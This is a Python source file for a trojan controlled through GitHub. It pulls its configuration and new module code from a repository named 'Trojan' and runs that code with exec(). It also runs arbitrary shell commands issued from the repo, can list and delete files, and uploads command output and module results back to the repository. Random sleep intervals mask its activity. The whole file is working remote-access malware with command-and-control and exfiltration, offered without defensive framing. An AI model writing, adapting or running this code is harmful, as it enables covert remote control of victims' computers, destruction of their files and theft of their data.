import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess
from datetime import datetime, timedelta

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.running = True

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config.get('modules', []):
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def check_condition(self, condition, args):
        if condition == "file_exists":
            return os.path.exists(args)
        elif condition == "process_running":
            output = subprocess.getoutput(f"tasklist | findstr {args}")
            return bool(output)
        return False

    def should_run(self, module_config):
        run_at = module_config.get('run_at')
        frequency = module_config.get('frequency')
        condition = module_config.get('condition')
        condition_args = module_config.get('condition_args')

        now = datetime.now()
        if run_at:
            run_time = datetime.fromisoformat(run_at)
            if now < run_time:
                return False

        if condition:
            if not self.check_condition(condition, condition_args):
                return False

        return True

    def schedule_next_run(self, module_config):
        frequency = module_config.get('frequency')
        run_at = module_config.get('run_at')
        now = datetime.now()

        if frequency == "daily":
            next_run = datetime.fromisoformat(run_at) + timedelta(days=1)
        elif frequency == "hourly":
            next_run = datetime.fromisoformat(run_at) + timedelta(hours=1)
        else:
            return  # For "once", we don't reschedule

        module_config['run_at'] = next_run.isoformat()

    def module_runner(self, module, config):
        if self.should_run(config):
            result = sys.modules[module].run()
            self.store_module_result(result)
            self.schedule_next_run(config)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def fetch_commands(self):
        config = self.get_config()
        commands = config.get('commands', [])
        return commands

    def execute_command(self, command):
        if command.lower() == 'stop':
            self.running = False
            self.update_status('Stopped')
        elif command.lower() == 'start':
            self.running = True
            self.update_status('Running')
        elif command.startswith('list_files'):
            directory = command.split(' ', 1)[1]
            result = subprocess.getoutput(f'dir {directory}')
            self.update_status(result)
        elif command.startswith('delete_file'):
            filename = command.split(' ', 1)[1]
            result = subprocess.getoutput(f'del {filename}')
            self.update_status(result)
        else:
            result = subprocess.getoutput(command)
            self.update_status(f"Command '{command}' executed with result: {result}")

    def update_status(self, status):
        status_file_path = f'status/{self.id}.status'

        try:
            contents = self.repo.file_contents(status_file_path)
            contents.update(status, status.encode('utf-8'))
        except github3.exceptions.NotFoundError:
            self.repo.create_file(status_file_path, status, status.encode('utf-8'))

    def run(self):
        while self.running:
            config = self.get_config()

            # Execute modules based on config
            for task in config.get('modules', []):
                thread = threading.Thread(target=self.module_runner, args=(task['module'], task))
                thread.start()
                time.sleep(random.randint(1, 10))

            # Execute commands
            commands = self.fetch_commands()
            for command in commands:
                self.execute_command(command)
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

